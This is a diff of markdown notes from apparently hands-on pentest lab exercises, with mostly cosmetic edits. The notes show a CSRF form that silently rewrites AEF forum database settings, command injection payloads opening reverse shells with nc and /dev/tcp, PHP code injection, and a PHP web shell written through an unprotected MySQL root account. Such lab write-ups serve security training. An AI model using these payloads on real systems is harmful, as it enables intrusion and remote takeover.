@@ -1006,18 +1007,18 @@ Exploit code(s):
 ===============
 CSRF 0x01:
 
-change mysql db settings
-note: however you will need to know or guess the database name.
+change mysql db settings📌
+note: however you will need to know or guess the database name.📌
 
-<form id="DOOM" accept-charset="ISO-8859-1" action="
+<form📌 id="DOOM" accept-charset="ISO-8859-1" action="
 http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=conpan&seadact=mysqlset"
 method="post" name="mysqlsetform">
 <input type="hidden" name="server" value="hyp3rlinx.altervista.org" />
 <input type="hidden" name="user" value="hyp3rlinx" />
 <input type="hidden" name="password" value="DESTROYED" />
-<input type="hidden" name="database" value="AEF" />
+<input type="hidden" name="database" value="AEF" />📌
 <input type="hidden" name="dbprefix" value="aef_" />
-<script>document.getElementById('DOOM').submit()</script>
+<script>document.getElementById('DOOM').submit()</script>📌
 </form>
 
 [...]
@@ -1027,7 +1028,7 @@ method="post" name="mysqlsetform">
 
 `vim ./csrf.html`:
 ```html
-<form id="DOOM" accept-charset="ISO-8859-1" action="
+<form id="DOOM"📌 accept-charset="ISO-8859-1" action="
 https://wij0p8tlyeqrezvx1057worm8.eu-central-7.attackdefensecloudlabs.com/index.php?act=admin&adact=conpan&seadact=mysqlset"
 method="post" name="mysqlsetform">
 <input type="hidden" name="server" value="server.site.com" />
@@ -1035,7 +1036,7 @@ method="post" name="mysqlsetform">
 <input type="hidden" name="password" value="H4ck3d!" />
 <input type="hidden" name="database" value="app" />
 <input type="hidden" name="dbprefix" value="aef_" />
-<script>document.getElementById('DOOM').submit()</script>
+<script>document.getElementById('DOOM').submit()</script>📌
 </form>
 ```
 
@@ -1043,7 +1044,7 @@ method="post" name="mysqlsetform">
 
 ---
 
-## Injection & Input Validation
+## Injection and Input Validation
 
 ### Command Injection
 
@@ -1053,9 +1054,9 @@ method="post" name="mysqlsetform">
 
 [OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.
 
-In the exercise, we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform command injection attack on a vulnerable file backup utility application. The application creates a backup of the file in the "backup" directory on the server.
+In the exercise, <u>we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform command injection attack on a vulnerable file backup utility application</u>. The application creates a backup of the file in the `backup` directory on the server.
 
-**Objective:** Perform Command Injection on the web app.
+**Objective:** <u>Perform Command Injection on the web app</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -1074,7 +1075,7 @@ Instructions: 
 
 `HTTP Request`:
 ```http
-POST /upload HTTP/1.1
+POST /upload📌 HTTP/1.1
 Host: 192.231.94.3:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
@@ -1086,7 +1087,7 @@ Content-Length: 35
 Origin: http://beta.file-backup.com:5000
 Connection: close
 
-{"file":"test.txt","data":"test\n"} 📌
+{"file":"test.txt","data":"test\n"}📌
 ```
 `HTTP Response`:
 ```http
@@ -1098,13 +1099,13 @@ Vary: Origin
 Server: Werkzeug/1.0.1 Python/2.7.17
 Date: Wed, 27 Nov 2024 15:45:34 GMT
 
-{"success": "File saved successfully!"}
+{"success": "File saved successfully!"}📌
 ```
 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.231.94.2 📌 netmask 255.255.255.0  broadcast 192.231.94.255
+        inet 192.231.94.2📌 netmask 255.255.255.0  broadcast 192.231.94.255
         ether 02:42:c0:e7:5e:02  txqueuelen 0  (Ethernet)
         RX packets 133  bytes 568545 (555.2 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -1135,7 +1136,7 @@ Content-Length: 35
 Origin: http://beta.file-backup.com:5000
 Connection: close
 
-{"file":"test.txt; nc 192.231.94.2 4444 -c '/bin/bash'","data":"test\n"} 📌
+{"file":"test.txt; nc 192.231.94.2 4444 -c '/bin/bash'","data":"test\n"}📌
 ```
 `HTTP Response`:
 ```http
@@ -1155,7 +1156,7 @@ Ncat: Connection from 192.231.94.3.
 Ncat: Connection from 192.231.94.3:40948.
 
 id
-uid=1000 gid=1000 groups=1000,0(root) 🚩
+uid=1000 gid=1000 groups=1000,0(root)🚩
 ```
 
 🔄 Alternative 🔄
@@ -1176,7 +1177,7 @@ Content-Length: 35
 Origin: http://beta.file-backup.com:5000
 Connection: close
 
-{"file":"test.txt; bash -c 'bash -i >& /dev/tcp/192.231.94.2/4444 0>&1'","data":"test\n"} 📌
+{"file":"test.txt; bash -c 'bash -i >& /dev/tcp/192.231.94.2/4444 0>&1'","data":"test\n"}📌
 ```
 `HTTP Response`:
 ```http
@@ -1200,7 +1201,7 @@ groups: cannot find name for group ID 1000
 I have no name!@victim-1:/$
 
 id
-uid=1000 gid=1000 groups=1000,0(root) 🚩
+uid=1000 gid=1000 groups=1000,0(root)🚩
 ```
 
 ### PHP Code Injection
@@ -1211,9 +1212,9 @@ uid=1000 gid=1000 groups=1000,0(root) 🚩
 
 [OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.
 
-In the exercise, we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform PHP code injection attack on [bWAPP](http://www.itsecgames.com/) web application.
+In the exercise, <u>we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform PHP code injection attack on [bWAPP](http://www.itsecgames.com/) web application</u>.
 
-**Objective**: Perform code injection on the web application and execute arbitrary commands on the target machine.
+**Objective**: <u>Perform code injection on the web application and execute arbitrary commands on the target machine</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -1230,7 +1231,7 @@ The following credentials might be needed:
 `ifconfig`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.146.24.2 📌 netmask 255.255.255.0  broadcast 192.146.24.255
+        inet 192.146.24.2📌 netmask 255.255.255.0  broadcast 192.146.24.255
         ether 02:42:c0:92:18:02  txqueuelen 0  (Ethernet)
         RX packets 15  bytes 1306 (1.2 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -1244,7 +1245,7 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 `HTTP Request`:
 ```http
-GET /phpi.php?message=test HTTP/1.1 📌
+GET /phpi.php?message=test📌 HTTP/1.1
 Host: 192.146.24.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1277,7 +1278,7 @@ Content-Type: text/html
 
     <p>This is just a test page, reflecting back your <a href="/phpi.php?message=test">message</a>...</p>
     
-    <p><i>test</i></p> 📌
+    <p><i>test</i></p>📌
 
 [...]
 ```
@@ -1286,7 +1287,7 @@ Content-Type: text/html
 
 `HTTP Request`:
 ```http
-GET /phpi.php?message=test;phpinfo() HTTP/1.1 📌
+GET /phpi.php?message=test;phpinfo()📌 HTTP/1.1
 Host: 192.146.24.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1341,7 +1342,7 @@ h2 {font-size: 125%;}
 .v {background-color: #cccccc; color: #000000;}
 .vr {background-color: #cccccc; text-align: right; color: #000000;}
 img {float: right; border: 0px;}
-hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;} 📌
+hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}📌
 
 [...]
 ```
@@ -1350,7 +1351,7 @@ hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #0
 
 `HTTP Request`:
 ```http
-GET /phpi.php?message=test;system(%22id%22) HTTP/1.1 📌
+GET /phpi.php?message=test;system(%22id%22)📌 HTTP/1.1
 Host: 192.146.24.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1383,7 +1384,7 @@ Content-Type: text/html
 
     <p>This is just a test page, reflecting back your <a href="/phpi.php?message=test">message</a>...</p>
     
-    <p><i>testuid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+    <p><i>testuid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 </i></p>
 
 [...]
@@ -1401,9 +1402,9 @@ Content-Type: text/html
 
 [OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.
 
-In the exercise, we will focus on [OWASP A6 Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration) flaws and we will take a look at how to leverage misconfigured MySQL service to execute arbitrary command on the target machine.
+In the exercise, <u>we will focus on [OWASP A6 Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration) flaws and we will take a look at how to leverage misconfigured MySQL service to execute arbitrary command on the target machine</u>.
 
-**Objective**: Leverage the misconfiguration and execute arbitrary commands on the target machine.
+**Objective**: <u>Leverage the misconfiguration and execute arbitrary commands on the target machine</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -1416,7 +1417,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.249.241.2 📌 netmask 255.255.255.0  broadcast 192.249.241.255
+        inet 192.249.241.2📌 netmask 255.255.255.0  broadcast 192.249.241.255
         ether 02:42:c0:f9:f1:02  txqueuelen 0  (Ethernet)
         RX packets 16  bytes 1376 (1.3 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -1433,21 +1434,21 @@ Host is up (0.000046s latency).
 PORT     STATE SERVICE VERSION
 3306/tcp open  mysql   MySQL 5.5.56-log
 | mysql-empty-password: 
-|_  root account has empty password 📌
+|_  root account has empty password📌
 MAC Address: 02:42:C0:F9:F1:03 (Unknown)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
 ```
 
-`sudo nmap -Pn -sSV -p 80 192.249.241.3`:
+`sudo nmap -Pn -sSV -p80 192.249.241.3`:
 ```
 Starting Nmap 7.70 ( https://nmap.org ) at 2024-11-27 21:49 IST
 Nmap scan report for target-1 (192.249.241.3)
 Host is up (0.000040s latency).
 
 PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 📌
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))📌
 MAC Address: 02:42:C0:F9:F1:03 (Unknown)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -1456,7 +1457,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
 
 `whatweb http://192.249.241.3`:
 ```
-http://192.249.241.3 [200 OK] Apache[2.4.18], Cookies[PHPSESSID], 📌 Country[CANADA][CA], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.249.241.3], JQuery, Script, Title[Welcome to Adive!]
+http://192.249.241.3 [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[CANADA][CA], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]📌, IP[192.249.241.3], JQuery, Script, Title[Welcome to Adive!]
 ```
 
 `mysql -u root -h 192.249.241.3`:
@@ -1476,7 +1477,7 @@ MySQL [(none)]> show databases;
 +--------------------+
 | information_schema |
 | adive              |
-| mysql              | 📌
+| mysql📌            | 
 | performance_schema |
 | test               |
 +--------------------+
@@ -1517,7 +1518,7 @@ MySQL [mysql]> show tables;
 | time_zone_name            |
 | time_zone_transition      |
 | time_zone_transition_type |
-| user                      |
+| user📌                    |
 +---------------------------+
 24 rows in set (0.009 sec)
 ```
@@ -1526,13 +1527,13 @@ MySQL [(none)]> select 'Hello world!' into outfile '/tmp/test.txt' from mysql.us
 Query OK, 1 row affected (0.001 sec)
 ```
 ```
-MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]); echo "<pre>".$output."</pre>" ?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 📌
+MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]); echo "<pre>".$output."</pre>" ?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;📌
 Query OK, 1 row affected (0.002 sec)
 ```
 
 `curl http://192.249.241.3/shell.php?cmd=id`:
 ```html
-<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 </pre>
 ```
 
